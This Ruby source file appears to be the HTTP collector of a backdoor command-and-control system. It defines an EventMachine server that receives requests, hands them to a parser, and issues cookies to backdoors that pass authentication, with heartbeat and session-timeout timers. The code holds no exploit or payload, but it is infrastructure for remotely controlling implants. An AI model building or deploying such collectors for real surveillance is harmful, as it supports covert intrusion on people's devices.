#
#  Event handlers
#

# relatives
require_relative 'heartbeat.rb'
require_relative 'parser.rb'
require_relative 'network_controller.rb'
require_relative 'sessions.rb'
require_relative 'status.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'eventmachine'
require 'evma_httpserver'
require 'socket'

module RCS
module Collector

class HTTPHandler < EM::Connection
  include RCS::Tracer
  include EM::HttpServer
  include RCS::Collector::Parser

  attr_reader :peer
  attr_reader :peer_port

  def post_init
    # don't forget to call super here !
    super

    # to speed-up the processing, we disable the CGI environment variables
    self.no_environment_strings

    # set the max content length of the POST
    self.max_content_length = 30 * 1024 * 1024

    # get the peer name
    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    trace :debug, "Connection from #{@peer}:#{@peer_port}"
  end

  def unbind
    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
  end

  def process_http_request
    # the http request details are available via the following instance variables:
    #   @http_protocol
    #   @http_request_method
    #   @http_cookie
    #   @http_if_none_match
    #   @http_content_type
    #   @http_path_info
    #   @http_request_uri
    #   @http_query_string
    #   @http_post_content
    #   @http_headers

    trace :info, "[#{@peer}] Incoming HTTP Connection"
    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"

    resp = EM::DelegatedHttpResponse.new(self)

    # Block which fulfills the request
    operation = proc do

      # do the dirty job :)
      # here we pass the control to the internal parser which will return:
      #   - the content of the reply
      #   - the content_type
      #   - the cookie if the backdoor successfully passed the auth phase
      begin
        content, content_type, cookie = http_parse(@http_request_method, @http_request_uri, @http_cookie, @http_post_content)
      rescue Exception => e
        trace :error, "ERROR: " + e.message
        #trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end

      # prepare the HTTP response
      resp.status = 200
      resp.status_string = "OK"
      resp.content = content
      resp.headers['Content-Type'] = content_type
      resp.headers['Set-Cookie'] = cookie unless cookie.nil?
      #TODO: investigate the keep-alive option
      #resp.keep_connection_open = true
    end

    # Callback block to execute once the request is fulfilled
    callback = proc do |res|
    	resp.send_response
      trace :info, "[#{@peer}] HTTP Connection completed"
    end

    # Let the thread pool handle request
    EM.defer(operation, callback)
  end

end #HTTPHandler

class Events
  include RCS::Tracer
  
  def setup(port = 80)

    # main EventMachine loop
    begin
      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll

        # start the HTTP server
        EM::start_server("0.0.0.0", port, HTTPHandler)
        trace :info, "Listening on port #{port}..."

        # we are alive and ready to party
        Status.my_status = Status::OK

        # send the first heartbeat to the db, we are alive and want to notify the db immediately
        HeartBeat.perform

        # set up the heartbeat (the interval is in the config)
        EM::PeriodicTimer.new(Config.instance.global['HB_INTERVAL']) { HeartBeat.perform }

        # set up the network checks (the interval is in the config, zero means disabled)
        if Config.instance.global['NC_INTERVAL'] != 0 then
          EM::PeriodicTimer.new(Config.instance.global['NC_INTERVAL']) { NetworkController.check }
        end

        # timeout for the sessions (will destroy inactive sessions)
        EM::PeriodicTimer.new(60) { SessionManager.instance.timeout }
      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor' then
        trace :fatal, "Cannot bind port #{Config.instance.global['LISTENING_PORT']}"
        return 1
      end
      raise
    end

  end

end #Events

end #Collector::
end #RCS::

